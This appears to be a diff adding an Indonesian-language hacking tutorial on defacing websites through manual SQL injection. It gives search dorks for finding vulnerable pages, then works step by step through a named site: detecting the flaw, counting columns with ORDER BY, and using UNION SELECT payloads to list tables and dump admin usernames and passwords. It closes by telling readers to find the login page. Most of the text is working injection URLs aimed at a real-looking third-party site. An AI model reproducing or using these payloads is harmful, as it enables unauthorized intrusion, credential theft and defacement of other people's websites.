@@ -1,0 +1,55 @@
+DEFACE CARA DEFACE SQL MANUAL DI ANDROID
+Cara Deface Sql Manual di Android
+
+
+
+dork :
+- inurl:/staff.php?id=
+- inurl:/news.php?id=
+kembangin sendiri gan.
+
+Nah Langsung Aja Karena Saya Udah Nemu Situs Yang Vuln Sql ,Oh iya Untuk Mengetahui Vuln Atau Tidak Kalian Hanya Perlu Masukan tanda ( ' ) di belakang angka Id nya, Contoh :
+http://www.jjhobby.com/viewproduct.php?id=9' Nah Kek gitu deh, maka muncul You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
+
+
+jika sudah ketemu ,kalian tinggal masukan +order+by+1--+- ,Jadinya :
+http://www.jjhobby.com/viewproduct.php?id=9+order+by+1--+-
+Kalian Terusin Sampai Ketemu Error ,jadinya
+http://www.jjhobby.com/viewproduct.php?id=9+order+by+1--+- => Ga error
+http://www.jjhobby.com/viewproduct.php?id=9+order+by+2--+- Ga error
+http://www.jjhobby.com/viewproduct.php?id=9+order+by+3--+- Ga error
+Sampai eror ya gan,
+
+
+
+
+Nah disini saya eror di http://www.jjhobby.com/viewproduct.php?id=9+order+by+11--+- Maka di Pastikan Table nya ada 10, Jika Sudah Gitu Kalian Tinggal ganti +order+by dengan +union+select,jangan lupa di kasih tanda (-) di depan angka id.
+
+
+
+jadinya : http://www.jjhobby.com/viewproduct.php?id=-9+union+select+3--+- karena tadi table nya ada 10 jadinya http://www.jjhobby.com/viewproduct.php?id=-9+union+select+1,2,3,4,5,6,7,8,9,10--+- .Maka Akan Terlihat angka Ajaib Nya.
+
+
+
+Saya akan pilih Angka Dua Aja Biar Mesra wkwkwk.Sekarang Kita masukan inject nya .
+inject : (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)
+Masukan Pas di angka yang muncul Tadi ,
+
+
+Jadinya : http://www.jjhobby.com/viewproduct.php?id=-9+union+select+1,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),3,4,5,6,7,8,9,10--+- Nah Disini Kalian Akan Lihat Banyak Table Table, Carilah Table Yang ada username dan password nya, kalo gak admin.
+
+
+
+Nah Jika Sudah Lihat, Kalian Tinggal Dump istilahnya, Atau Buka Table Caranya Dengan Masukan Inject : /*!50000(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+utenti)*/ ,
+
+Disini user dan password saya di Table securityTab.dan nama table adminnya user_id. dan asswordnya user_pw. Jadi kalian edit inject nya jadi : /*!50000(SELECT+GROUP_CONCAT([user_id],0x3a,[user_pw]+SEPARATOR+0x3c62723e)+FROM+[securityTab])*/
+Yang Saya Tandai [ ] Yang Harus Kalian Ganti.
+
+Maka Jadinya : http://www.jjhobby.com/viewproduct.php?id=-9+union+select+1,/*!50000(SELECT+GROUP_CONCAT(user_id,0x3a,user_pw+SEPARATOR+0x3c62723e)+FROM+securityTab)*/,3,4,5,6,7,8,9,10--+-
+Nanti Saat Kalian Buka ,Akan Muncul user + password .
+
+
+Tinggal Kalian Cari Login Page Nya
+
+
+TTD : JakartaXploite
